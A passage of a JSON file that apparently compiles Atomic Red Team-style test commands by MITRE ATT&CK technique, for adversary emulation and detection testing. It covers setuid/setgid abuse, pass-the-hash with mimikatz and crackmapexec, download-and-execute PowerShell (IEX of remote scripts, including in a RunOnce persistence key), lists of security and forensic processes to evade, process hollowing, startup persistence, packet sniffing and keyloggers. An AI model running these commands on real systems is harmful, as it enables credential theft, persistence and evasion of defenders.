         },
         {
            "description": "This test gives a file the capability to set UID without using flags.\n",
            "command": "touch /tmp/evilBinary; sudo setcap cap_setuid=ep /tmp/evilBinary"
         },
         {
            "description": "Make, change owner, and change file attributes on a C source code file\n",
            "command": "cp; sudo chown root /tmp/hello.c; sudo make /tmp/hello; sudo chown root /tmp/hello; sudo chmod u+s /tmp/hello; /tmp/hello"
         },
         {
            "description": "This test sets the SetUID flag on a file in Linux and macOS.\n",
            "command": "sudo touch /tmp/evilBinary; sudo chown root /tmp/evilBinary; sudo chmod u+xs /tmp/evilBinary"
         },
         {
            "description": "This test simulates a command that can be run to enumerate files that have the setgid bit set\n",
            "command": "find /usr/bin -perm -2000"
         },
         {
            "description": "Make and modify [capabilities](https://man7.org/linux/man-pages/man7/capabilities.7.html) of a C source code file.\nThe binary doesn't have to modify the UID, but the binary is given the capability to arbitrarily modify it at any time with `setuid(0)`.\nWithout being owned by root, the binary can set the UID to 0.\n",
            "command": "cp; make /tmp/cap; sudo setcap cap_setuid=ep /tmp/cap; /tmp/cap"
         },
         {
            "description": "This test sets the SetGID flag on a file in Linux and macOS.\n",
            "command": "sudo touch /tmp/evilBinary; sudo chown root /tmp/evilBinary; sudo chmod g+xs /tmp/evilBinary"
         }
      ]
   },
   "T1550.002": {
      "technique_name": "Use Alternate Authentication Material: Pass the Hash",
      "tactic": "multiple",
      "known implementations": [
         {
            "description": "command execute with crackmapexec\n",
            "command": "C:\\CrackMapExecWin\\crackmapexec.exe %userdnsdomain% -u Administrator -H cc36cf7a8514893efccd3324464tkg1a -x whoami"
         },
         {
            "description": "Note: must dump hashes first\n[Reference](https://github.com/gentilkiwi/mimikatz/wiki/module-~-sekurlsa#pth)\n",
            "command": "%tmp%\\mimikatz\\x64\\mimikatz.exe \"sekurlsa::pth /user:Administrator /domain:%userdnsdomain% /ntlm:cc36cf7a8514893efccd3324464tkg1a\""
         },
         {
            "description": "Use Invoke-WMIExec to Pass the Hash\nNote: must dump hashes first\n[Reference](https://github.com/gentilkiwi/mimikatz/wiki/module-~-sekurlsa#pth)",
            "command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; IEX (IWR 'https://raw.githubusercontent.com/Kevin-Robertson/Invoke-TheHash/01ee90f934313acc7d09560902443c18694ed0eb/Invoke-WMIExec.ps1' -UseBasicParsing);Invoke-WMIExec -Target $env:COMPUTERNAME -Username Administrator -Hash cc36cf7a8514893efccd3324464tkg1a -Command hostname"
         }
      ]
   },
   "T1497.001": {
      "technique_name": "Virtualization/Sandbox Evasion: System Checks",
      "tactic": "multiple",
      "known implementations": [
         {
            "description": "Windows Management Instrumentation(WMI) objects contain system information which helps to detect virtualization. This test will get the model and manufacturer of the machine to determine if it is a virtual machine, such as through VMware or VirtualBox. \n",
            "command": "$Manufacturer = Get-WmiObject -Class Win32_ComputerSystem | select-object -expandproperty \"Manufacturer\"; $Model = Get-WmiObject -Class Win32_ComputerSystem | select-object -expandproperty \"Model\"; if((($Manufacturer.ToLower() -eq \"microsoft corporation\") -and ($Model.ToLower().contains(\"virtual\"))) -or ($Manufacturer.ToLower().contains(\"vmware\")) -or ($Model.ToLower() -eq \"virtualbox\")) {write-host \"Virtualization environment detected!\"} else {write-host \"No virtualization environment detected!\"}"
         },
         {
            "description": "Windows Management Instrumentation(WMI) objects contains system information which helps to detect virtualization. This command will specifically attempt to get the CurrentTemperature value from this object and will check to see if the attempt results in an error that contains the word supported. This is meant to find the result of Not supported, which is the result if run in a virtual machine\n",
            "command": "$error.clear(); Get-WmiObject -Query \"SELECT * FROM MSAcpi_ThermalZoneTemperature\" -ErrorAction SilentlyContinue; if($error) {echo \"Virtualization Environment detected\"}"
         },
         {
            "description": "ioreg contains registry entries for all the device drivers in the system. If it's a virtual machine, one of the device manufacturer will be a Virtualization Software.\n",
            "command": "if (ioreg -l | grep -e Manufacturer -e 'Vendor Name' | grep -iE 'Oracle|VirtualBox|VMWare|Parallels') then echo 'Virtualization Environment detected'; fi; "
         },
         {
            "description": "systemd-detect-virt detects execution in a virtualized environment.\nAt boot, dmesg stores a log if a hypervisor is detected.\n",
            "command": "if (systemd-detect-virt) then echo \"Virtualization Environment detected\"; fi; if (sudo dmidecode | egrep -i 'manufacturer|product|vendor' | grep -iE 'Oracle|VirtualBox|VMWare|Parallels') then echo \"Virtualization Environment detected\"; fi; "
         },
         {
            "description": "Determine if the system is virtualized or physical",
            "command": "get-wmiobject win32_computersystem | fl model\n"
         },
         {
            "description": "Check for security services. Security service list is based on the SUNBURST malware observed in a Solarwinds related compromise (https://research.checkpoint.com/2020/sunburst-teardrop-and-the-netsec-new-normal/).",
            "command": "$securityServices = @(\n    \"msmpeng\",\n    \"windefend\",\n    \"mssense\",\n    \"sense\",\n    \"microsoft.tri.sensor\",\n    \"microsoft.tri.sensor.updater\",\n    \"cavp\",\n    \"cb\",\n    \"carbonblack\",\n    \"carbonblackk\",\n    \"cbcomms\",\n    \"cbstream\",\n    \"csfalconservice\",\n    \"csfalconcontainer\",\n    \"csagent\",\n    \"csdevicecontrol\",\n    \"csfalconservice\",\n    \"xagt\",\n    \"xagtnotif\",\n    \"fe_avk\",\n    \"fekern\",\n    \"feelam\",\n    \"fewscservice\",\n    \"ekrn\",\n    \"eguiproxy\",\n    \"egui\",\n    \"eamonm\",\n    \"eelam\",\n    \"ehdrv\",\n    \"ekrnepfw\",\n    \"epfwwfp\",\n    \"ekbdflt\",\n    \"epfw\",\n    \"fsgk32st\",\n    \"fswebuid\",\n    \"fsgk32\",\n    \"fsma32\",\n    \"fssm32\",\n    \"fnrb32\",\n    \"fsaua\",\n    \"fsorsp\",\n    \"fsav32\",\n    \"f-secure gatekeeper handler starter\",\n    \"f-secure network request broker\",\n    \"f-secure webui daemon\",\n    \"fsma\",\n    \"fsorspclient\",\n    \"f-secure gatekeeper\",\n    \"f-secure hips\",\n    \"fsbts\",\n    \"fsni\",\n    \"fsvista\",\n    \"f-secure filter\",\n    \"f-secure recognizer\",\n    \"fses\",\n    \"fsfw\",\n    \"fsdfw\",\n    \"fsms\",\n    \"fsdevcon\"\n);\n\n$currentServices = Get-Service | Select-Object -Property Name;\nforeach ($svc in $currentServices) {\n    foreach ($secSvc in $securityServices) {\n        if ($svc.Name -like $secSvc) {\n            $svcDetails = Get-Service -name $svc.Name | Select-Object -Property Name, DisplayName, Status;\n            Write-Host \"[!] Security service found:\";\n            Write-Host \"    Service Name:`t\", $svcDetails.Name;\n            Write-Host \"    Display Name:`t\", $svcDetails.DisplayName;\n            Write-Host \"    Status:`t`t\", $svcDetails.Status;\n            Write-Host \"\";\n        }\n    }\n}\n"
         },
         {
            "description": "Check for analysis/sandbox environment processes. Process black list is based on the SUNBURST malware observed in a Solarwinds related compromise (https://research.checkpoint.com/2020/sunburst-teardrop-and-the-netsec-new-normal/).",
            "command": "$forensicProcesses = @(\n    \"apimonitor-x64\",\n    \"apimonitor-x86\",\n    \"autopsy64\",\n    \"autopsy\",\n    \"autoruns64\",\n    \"autoruns\",\n    \"autorunsc64\",\n    \"autorunsc\",\n    \"binaryninja\",\n    \"blacklight\",\n    \"cff explorer\",\n    \"cutter\",\n    \"de4dot\",\n    \"debugview\",\n    \"diskmon\",\n    \"dnsd\",\n    \"dnspy\",\n    \"dotpeek32\",\n    \"dotpeek64\",\n    \"dumpcap\",\n    \"evidence center\",\n    \"exeinfope\",\n    \"fakedns\",\n    \"fakenet\",\n    \"ffdec\",\n    \"fiddler\",\n    \"fileinsight\",\n    \"floss\",\n    \"gdb\",\n    \"hiew32demo\",\n    \"hiew32\",\n    \"hollows_hunter\",\n    \"idaq64\",\n    \"idaq\",\n    \"idr\",\n    \"ildasm\",\n    \"ilspy\",\n    \"jd-gui\",\n    \"lordpe\",\n    \"officemalscanner\",\n    \"ollydbg\",\n    \"pdfstreamdumper\",\n    \"pe-bear\",\n    \"pebrowse64\",\n    \"peid\",\n    \"pe-sieve32\",\n    \"pe-sieve64\",\n    \"pestudio\",\n    \"peview\",\n    \"ppee\",\n    \"procdump64\",\n    \"procdump\",\n    \"processhacker\",\n    \"procexp64\",\n    \"procexp\",\n    \"procmon\",\n    \"prodiscoverbasic\",\n    \"py2exedecompiler\",\n    \"r2agent\",\n    \"rabin2\",\n    \"radare2\",\n    \"ramcapture64\",\n    \"ramcapture\",\n    \"reflector\",\n    \"regmon\",\n    \"resourcehacker\",\n    \"retdec-ar-extractor\",\n    \"retdec-bin2llvmir\",\n    \"retdec-bin2pat\",\n    \"retdec-config\",\n    \"retdec-fileinfo\",\n    \"retdec-getsig\",\n    \"retdec-idr2pat\",\n    \"retdec-llvmir2hll\",\n    \"retdec-macho-extractor\",\n    \"retdec-pat2yara\",\n    \"retdec-stacofin\",\n    \"retdec-unpacker\",\n    \"retdec-yarac\",\n    \"rundotnetdll\",\n    \"sbiesvc\",\n    \"scdbg\",\n    \"scylla_x64\",\n    \"scylla_x86\",\n    \"shellcode_launcher\",\n    \"solarwindsdiagnostics\",\n    \"sysmon64\",\n    \"sysmon\",\n    \"task explorer\",\n    \"task explorer-x64\",\n    \"tcpdump\",\n    \"tcpvcon\",\n    \"tcpview\",\n    \"vboxservice\",\n    \"win32_remote\",\n    \"win64_remotex64\",\n    \"windbg\",\n    \"windump\",\n    \"winhex64\",\n    \"winhex\",\n    \"winobj\",\n    \"wireshark\",\n    \"x32dbg\",\n    \"x64dbg\",\n    \"xwforensics64\",\n    \"xwforensics\",\n    \"redcloak\",\n    \"avgsvc\",\n    \"avgui\",\n    \"avgsvca\",\n    \"avgidsagent\",\n    \"avgsvcx\",\n    \"avgwdsvcx\",\n    \"avgadminclientservice\",\n    \"afwserv\",\n    \"avastui\",\n    \"avastsvc\",\n    \"aswidsagent\",\n    \"aswidsagenta\",\n    \"aswengsrv\",\n    \"avastavwrapper\",\n    \"bccavsvc\",\n    \"psanhost\",\n    \"psuaservice\",\n    \"psuamain\",\n    \"avp\",\n    \"avpui\",\n    \"ksde\",\n    \"ksdeui\",\n    \"tanium\",\n    \"taniumclient\",\n    \"taniumdetectengine\",\n    \"taniumendpointindex\",\n    \"taniumtracecli\",\n    \"taniumtracewebsocketclient64\"\n);\n\nfunction Find-ForensicProcesses {\n    param (\n        $ForensicProcessList\n    );\n    $CurrentProcesses = Get-Process | Sort-Object | Select-Object -Property Name | Get-Unique -AsString;\n    foreach ($proc in $CurrentProcesses) {\n        foreach ($forensicProc in $ForensicProcessList) {\n            if ($proc.name -like $forensicProc) {\n                $procPath = Get-Process -Name $proc.Name | Sort-Object | Select-Object -Property Path | Get-Unique;\n                Write-Host \"[!] Forensic process found: \" $proc.Name;\n                Write-Host \"[!] Path: \" $procPath.Path;\n            }\n        }\n    }\n}\n\nFind-ForensicProcesses($forensicProcesses);"
         }
      ]
   },
   "T1055.012": {
      "technique_name": "Process Injection: Process Hollowing",
      "tactic": "multiple",
      "known implementations": [
         {
            "description": "This test uses PowerShell to create a Hollow from a PE on disk with explorer as the parent.\nCredit to FuzzySecurity (https://github.com/FuzzySecurity/PowerShell-Suite/blob/master/Start-Hollow.ps1)\n",
            "command": ". \"C:\\Users\\puma-4\\Desktop\\Start-Hollow.ps1\"; $ppid=Get-Process explorer | select -expand id; Start-Hollow -Sponsor \"C:\\Windows\\System32\\notepad.exe\" -Hollow \"C:\\Windows\\System32\\cmd.exe\" -ParentPID $ppid -Verbose"
         },
         {
            "description": "This module executes notepad.exe from within the WINWORD.EXE process\n",
            "command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; IEX (iwr \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\" -UseBasicParsing) ; Invoke-MalDoc -macroFile \"PathToAtomicsFolder\\T1055.012\\src\\T1055.012-macrocode.txt\" -officeProduct \"Word\" -sub \"Exploit\""
         }
      ]
   },
   "T1547.001": {
      "technique_name": "Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder",
      "tactic": "multiple",
      "known implementations": [
         {
            "description": "bat files can be placed in and executed from the startup folder to maintain persistance\n\nUpon execution, cmd will be run and immediately closed. Additionally, the new files can be viewed in the \"$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\"\nfolder and will also run when the computer is restarted and the user logs in.\n",
            "command": "Copy-Item \"C:\\Users\\puma-4\\Desktop\\batstartup.bat\" \"$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\batstartup.bat\"; Copy-Item \"C:\\Users\\puma-4\\Desktop\\batstartup.bat\" \"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\batstartup.bat\"; Start-Process \"$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\batstartup.bat\"; Start-Process \"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\batstartup.bat\""
         },
         {
            "description": "jse files can be placed in and ran from the startup folder to maintain persistance.\nUpon execution, \"T1547.001 Hello, World JSE!\" will be displayed twice. \nAdditionally, the new files can be viewed in the \"$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\"\nfolder and will also run when the computer is restarted and the user logs in.\n",
            "command": "Copy-Item \"C:\\Users\\puma-4\\Desktop\\jsestartup.jse\" \"$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\jsestartup.jse\"; Copy-Item \"C:\\Users\\puma-4\\Desktop\\jsestartup.jse\" \"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\jsestartup.jse\"; cscript.exe /E:Jscript \"$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\jsestartup.jse\"; cscript.exe /E:Jscript \"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\jsestartup.jse\""
         },
         {
            "description": "RunOnce Key Persistence via PowerShell\nUpon successful execution, a new entry will be added to the runonce item in the registry.\n",
            "command": "$RunOnceKey = \"HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce\"; set-itemproperty $RunOnceKey \"NextRun\" 'powershell.exe \"IEX (New-Object Net.WebClient).DownloadString(`\"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1547.001/src/Discovery.bat`\")\"'"
         },
         {
            "description": "secedit allows to manipulate the HKLM hive of the Windows registry. This test creates a Run key with the keyname calc having calc.exe as the value in the HKLM hive.\n[Reference](https://blueteamops.medium.com/secedit-and-i-know-it-595056dee53d)\n",
            "command": "secedit /import /db mytemplate.db /cfg \"035557_regtemplate.ini\" && secedit /configure /db mytemplate.db"
         },
         {
            "description": "RunOnce Key Persistence.\n\nUpon successful execution, cmd.exe will modify the registry to load AtomicRedTeam.dll to RunOnceEx. Output will be via stdout. \n",
            "command": "REG ADD HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx\\0001\\Depend /v 1 /d \"C:\\Path\\AtomicRedTeam.dll\""
         },
         {
            "description": "This test will modify the HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders -V \"Common Startup\" \nvalue to point to a new startup folder where a payload could be stored to launch at boot.  *successful execution requires system restart\n",
            "command": "New-Item -ItemType Directory -path \"#{new_startup_folder}\"; Copy-Item -path \"#{payload}\" -destination \"#{new_startup_folder}\"; Set-ItemProperty -Path  \"HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders\" -Name \"Common Startup\" -Value \"#{new_startup_folder}\""
         },
         {
            "description": "This test modifies the BootExecute registry value to \"autocheck autoche *\", which can be used to simulate an adversary's attempt to tamper with the system's boot process. \nReference - https://www.welivesecurity.com/wp-content/uploads/2018/09/ESET-LoJax.pdf\nNOTE that by not saving the correct value, you may inhibit your system from booting properly. Only run on a test system. There is a reg export before running the Atomic.\n",
            "command": "if (!(Test-Path \"$PathToAtomicsFolder\\T1547.001\\src\\SessionManagerBackup.reg\")) { reg.exe export \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\" \"$PathToAtomicsFolder\\T1547.001\\src\\SessionManagerBackup.reg\" /y }; Set-ItemProperty -Path \"HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\" -Name \"BootExecute\" -Value \"autocheck autoche *\" -Type MultiString"
         },
         {
            "description": "Add a persistance via Recycle bin [vxunderground](https://github.com/vxunderground/VXUG-Papers/blob/main/The%20Persistence%20Series/Persistence%20via%20Recycle%20Bin/Persistence_via_Recycle_Bin.pdf)\nUser have to clic on the recycle bin to lauch the payload (here calc)\n",
            "command": "reg ADD \"HKCR\\CLSID\\{645FF040-5081-101B-9F08-00AA002F954E}\\shell\\open\\command\" /ve /d \"calc.exe\" /f"
         },
         {
            "description": "This test will create a HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run key value to launch calc.exe on boot. \n*Requires reboot\n",
            "command": "if (!(Test-Path -Path \"HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run\")){;   New-Item -ItemType Key -Path  \"HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run\"; }; Set-ItemProperty -Path  \"HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run\" -Name \"#{target_key_value_name}\" -Value \"#{payload}\""
         },
         {
            "description": "This test change the default value of HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Shell from \"explorer.exe\" to the full path of \"C:\\Windows\\explorer.exe\" \nto log a change to the key's default value without breaking boot sequence. \nAn atacker will alternatively replace this with a custom shell. \n",
            "command": "$oldvalue = $(Get-ItemPropertyValue -Path  \"HKLM:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" -Name \"Shell\"); Set-ItemProperty -Path \"HKLM:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" -Name \"Shell-backup\" -Value \"$oldvalue\"; $newvalue = $oldvalue + \", #{payload}\"; Set-ItemProperty -Path  \"HKLM:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" -Name \"Shell\" -Value \"$newvalue\""
         },
         {
            "description": "This test will modify the HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders  -V \"Startup\" value \nto point to a new startup folder where a payload could be stored to launch at boot.  *successful execution requires system restart\n",
            "command": "New-Item -ItemType Directory -path \"#{new_startup_folder}\"; Copy-Item -path \"#{payload}\" -destination \"#{new_startup_folder}\"; Set-ItemProperty -Path  \"HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders\" -Name \"Startup\" -Value \"#{new_startup_folder}\""
         },
         {
            "description": "Run Key Persistence\n\nUpon successful execution, cmd.exe will modify the registry by adding \\\"Atomic Red Team\\\" to the Run key. Output will be via stdout. \n",
            "command": "REG ADD \"HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\" /V \"Atomic Red Team\" /t REG_SZ /F /D \"C:\\Path\\AtomicRedTeam.exe\""
         },
         {
            "description": "vbs files can be placed in and ran from the startup folder to maintain persistance. Upon execution, \"T1547.001 Hello, World VBS!\" will be displayed twice. \nAdditionally, the new files can be viewed in the \"$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\"\nfolder and will also run when the computer is restarted and the user logs in.\n",
            "command": "Copy-Item \"C:\\Users\\puma-4\\Desktop\\vbsstartup.vbs\" \"$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\vbsstartup.vbs\"; Copy-Item \"C:\\Users\\puma-4\\Desktop\\vbsstartup.vbs\" \"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\vbsstartup.vbs\"; cscript.exe \"$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\vbsstartup.vbs\"; cscript.exe \"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\vbsstartup.vbs\""
         },
         {
            "description": "This Atomic will create a registry key called socks5_powershell for persistance access\nhttps://medium.com/walmartglobaltech/systembc-powershell-version-68c9aad0f85c\n",
            "command": "$RunKey = \"HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\"; Set-ItemProperty -Path $RunKey -Name \"socks5_powershell\" -Value \"powershell.exe -windowstyle hidden -ExecutionPolicy Bypass -File\""
         },
         {
            "description": "Adds a non-malicious executable shortcut link to the current users startup directory. Test can be verified by going to the users startup directory and checking if the shortcut link exists. ",
            "command": "$Target = \"C:\\Windows\\System32\\calc.exe\"; $ShortcutLocation = \"$home\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\calc_exe.lnk\"; $WScriptShell = New-Object -ComObject WScript.Shell; $Create = $WScriptShell.CreateShortcut($ShortcutLocation); $Create.TargetPath = $Target; $Create.Save()"
         },
         {
            "description": "This test will append a command to the  HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Userinit value to launch calc.exe on boot.\n* Requires reboot\n",
            "command": "$oldvalue = $(Get-ItemPropertyValue -Path  \"HKLM:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" -Name \"Userinit\"); Set-ItemProperty -Path \"HKLM:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" -Name \"Userinit-backup\" -Value \"$oldvalue\"; $newvalue = $oldvalue + \" #{payload}\"; Set-ItemProperty -Path  \"HKLM:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" -Name \"Userinit\" -Value \"$newvalue\""
         },
         {
            "description": "This test will create a new value under HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run to launch calc.exe on boot. \n*Requires reboot\n",
            "command": "if (!(Test-Path -Path \"HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run\")){;   New-Item -ItemType Key -Path  \"HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run\"; }; Set-ItemProperty -Path  \"HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run\" -Name \"#{target_key_value_name}\" -Value \"#{payload}\""
         }
      ]
   },
   "T1040": {
      "technique_name": "Network Sniffing",
      "tactic": "multiple",
      "known implementations": [
         {
            "description": "Opens a /dev/bpf file (O_RDONLY), sets BPF filter for 'udp' and captures packets for a few seconds.\n",
            "command": "sudo /tmp/t1040_macos_pcapdemo -f -i en0 -t 3"
         },
         {
            "description": "Opens a /dev/bpf file (O_RDONLY) and captures packets for a few seconds.\n",
            "command": "sudo /tmp/t1040_macos_pcapdemo -i en0 -t 3"
         },
         {
            "description": "Captures packets with domain=AF_INET,type=SOCK_PACKET,protocol=UDP for a few seconds.\nSOCK_PACKET is \"obsolete\" according to the man page, but still works on Ubuntu 20.04\n",
            "command": "sudo /tmp/t1040_linux_pcapdemo -4 -P -p 17 -t 3"
         },
         {
            "description": "Perform a PCAP. Wireshark will be required for tshark. TCPdump may already be installed.\n\nUpon successful execution, tshark or tcpdump will execute and capture 5 packets on interface ens33.\n",
            "command": "tcpdump -c 5 -nnni ens33; tshark -c 5 -i ens33"
         },
         {
            "description": "Captures packets with domain=AF_PACKET,type=SOCK_RAW for a few seconds.\nSets a BPF filter on the socket to filter for UDP traffic.\n",
            "command": "sudo /tmp/t1040_linux_pcapdemo -a -f -t 3"
         },
         {
            "description": "Captures packets with domain=AF_INET,type=SOCK_RAW,protocol=TCP for a few seconds.\n",
            "command": "sudo /tmp/t1040_linux_pcapdemo -4 -p 6 -t 3"
         },
         {
            "description": "Will start a packet capture and store log file as t1040.etl.\nhttps://lolbas-project.github.io/lolbas/Binaries/Pktmon/",
            "command": "pktmon.exe start --etw  -f %TEMP%\\t1040.etl && TIMEOUT /T 5 >nul 2>&1 && pktmon.exe stop"
         },
         {
            "description": "Perform a PCAP on macOS. This will require Wireshark/tshark to be installed. TCPdump may already be installed.\n\nUpon successful execution, tshark or tcpdump will execute and capture 5 packets on interface en0A.\n",
            "command": "sudo tcpdump -c 5 -nnni en0A    ; if [ -x \"$(command -v tshark)\" ]; then sudo tshark -c 5 -i en0A; fi; "
         },
         {
            "description": "Uses the built-in Windows packet capture\nAfter execution you should find a file named trace.etl and trace.cab in the temp directory",
            "command": "netsh trace start capture=yes tracefile=%temp%\\trace.etl maxsize=10"
         },
         {
            "description": "Captures packets with domain=AF_PACKET, type=SOCK_RAW for a few seconds.\n",
            "command": "sudo /tmp/t1040_linux_pcapdemo -a -t 3"
         },
         {
            "description": "Select Desired ports for packet capture \nhttps://lolbas-project.github.io/lolbas/Binaries/Pktmon/",
            "command": "pktmon.exe filter add -p 445"
         },
         {
            "description": "Perform a packet capture using the windows command prompt. This will require a host that has Wireshark/Tshark\ninstalled.\n\nUpon successful execution, tshark will execute and capture 5 packets on interface \"Ethernet\".\n",
            "command": "\"c:\\Program Files\\Wireshark\\tshark.exe\" -i Ethernet -c 5"
         },
         {
            "description": "Perform a packet capture",
            "command": "$path = \"$ENV:UserProfile\\Desktop\\pcap.etl\";\nNew-NetEventSession -Name \"PCAP\" -CaptureMode SaveToFile -LocalFilePath $path;\nAdd-NetEventProvider -Name \"Microsoft-Windows-TCPIP\" -SessionName \"PCAP\";\nStart-NetEventSession -Name \"PCAP\";\nStart-Sleep -s 60;\nStop-NetEventSession -Name \"PCAP\";\nif (Test-Path $path) {\n  echo $path;\n  exit 0;\n} else {\n  echo \"Failed to generate PCAP file.\";\n  exit 1;\n};\n"
         }
      ]
   },
   "T1547.007": {
      "technique_name": "Boot or Logon Autostart Execution: Re-opened Applications",
      "tactic": "multiple",
      "known implementations": [
         {
            "description": "Copy in new loginwindow.plist to launch Calculator.\n",
            "command": "cp b1d66c_reopen_loginwindow_calc.plist ~/Library/Preferences/ByHost/com.apple.loginwindow.plist"
         },
         {
            "description": "Appends an entry to launch Calculator hidden loginwindow.*.plist for next login.\nNote that the change may not result in the added Calculator program launching on next user login.\nIt may depend on which version of macOS you are running on.\n",
            "command": "FILE=`find ~/Library/Preferences/ByHost/com.apple.loginwindow.*.plist -type f | head -1`; if [ -z \"${FILE}\" ] ; then echo \"No loginwindow plist file found\" && exit 1 ; fi; echo save backup copy to /tmp/; cp ${FILE} /tmp/t1547007_loginwindow-backup.plist; echo before; plutil -p ${FILE}; echo overwriting...; /tmp/t1547007_append_exe ${FILE} && echo after && plutil -p ${FILE}"
         },
         {
            "description": "Mac Defaults\n\n[Reference](https://developer.apple.com/library/content/documentation/MacOSX/Conceptual/BPSystemStartup/Chapters/CustomLogin.html)\n",
            "command": "sudo defaults write com.apple.loginwindow LoginHook /path/to/script"
         }
      ]
   },
   "T1056.001": {
      "technique_name": "Input Capture: Keylogging",
      "tactic": "multiple",
      "known implementations": [
         {
            "description": "The linux audit tool auditd can be used to capture 32 and 64 bit command execution and place the command in the /var/log/audit/audit.log audit log. \n",
            "command": "auditctl -a always,exit -F arch=b64 -S execve -k CMDS ; auditctl -a always,exit -F arch=b32 -S execve -k CMDS; whoami; ausearch -i --start $(date +\"%d/%m/%y %H:%M:%S\")"
         },
         {
            "description": "Utilize PowerShell and external resource to capture keystrokes\n[Payload](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1056.001/src/Get-Keystrokes.ps1)\nProvided by [PowerSploit](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Get-Keystrokes.ps1)\n\nUpon successful execution, Powershell will execute `Get-Keystrokes.ps1` and output to key.log.\n",
            "command": "if (Test-Path \"C:\\Users\\puma-4\\Desktop\\Get-Keystrokes.ps1\") { ; } else {New-Item -ItemType Directory (Split-Path \"C:\\Users\\puma-4\\Desktop\\Get-Keystrokes.ps1\") -Force | Out-Null; Invoke-WebRequest https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1056.001/src/Get-Keystrokes.ps1 -OutFile \"C:\\Users\\puma-4\\Desktop\\Get-Keystrokes.ps1\"};  ;  &\"C:\\Users\\puma-4\\Desktop\\Get-Keystrokes.ps1\" -LogPath $env:TEMP\\key.log"
         },
         {
            "description": "When a command is executed in bash, the BASH_COMMAND variable contains that command. For example :~$ echo $BASH_COMMAND = \"echo $BASH_COMMAND\". The trap command is not a external command, but a built-in function of bash and can be used in a script to run a bash function when some event occurs. trap will detect when the BASH_COMMAND variable value changes and then pipe that value into a file, creating a bash session based keylogger. \n\nTo gain persistence the command could be added to the users .bashrc or .bash_aliases or the systems default .bashrc in /etc/skel/ \n",
            "command": "trap 'echo \"$(date +\"%d/%m/%y %H:%M:%S.%s\") $USER $BASH_COMMAND\" >> /tmp/.keyboard.log' DEBUG; echo \"Hello World!\"; cat /tmp/.keyboard.log"
         },
         {
            "description": "Linux PAM (Pluggable Authentication Modules) is used in sshd authentication. The Linux audit tool auditd can use the pam_tty_audit module to enable auditing of TTY input and capture all keystrokes in a ssh session and place them in the /var/log/audit/audit.log file after the session closes.\n",
            "command": "cp -v /etc/pam.d/sshd /tmp/; echo \"session required pam_tty_audit.so disable=* enable=* open_only log_passwd\" >> /etc/pam.d/sshd; systemctl restart sshd; systemctl restart auditd; ssh ubuntu@localhost ; whoami; sudo su; whoami; exit; exit"
         },
         {
